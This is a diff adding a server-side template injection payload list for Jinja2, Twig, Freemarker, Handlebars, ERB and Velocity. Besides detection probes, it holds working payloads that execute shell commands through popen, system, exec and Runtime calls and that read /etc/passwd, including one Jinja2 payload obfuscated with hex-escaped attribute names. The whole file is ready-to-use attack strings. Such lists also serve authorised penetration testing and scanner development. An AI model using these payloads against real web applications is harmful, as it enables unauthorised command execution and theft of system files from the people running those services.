@@ -1,0 +1,46 @@
+# Server-Side Template Injection (SSTI) payloads
+# Covers Jinja2, Twig, Freemarker, Handlebars, ERB, Velocity, Pebble.
+
+# --- Detection probes (math that should evaluate) ---
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+{7*7}
+${{7*7}}
+{{7*'7'}}
+{{''.__class__}}
+
+# --- Jinja2 (Python/Flask) ---
+{{config}}
+{{config.items()}}
+{{self.__dict__}}
+{{request.environ}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+# --- Twig (PHP) ---
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{app.request.server.all|join(',')}}
+
+# --- Freemarker (Java) ---
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${object.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(object.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+
+# --- Handlebars (Node.js) ---
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+# --- ERB (Ruby) ---
+<%= 7*7 %>
+<%= `id` %>
+<%= File.read('/etc/passwd') %>
+
+# --- Velocity (Java) ---
+#set($x='')##
+#set($rt = $x.class.forName('java.lang.Runtime'))
+#set($chr = $x.class.forName('java.lang.Character'))
+#set($str = $x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('id'))
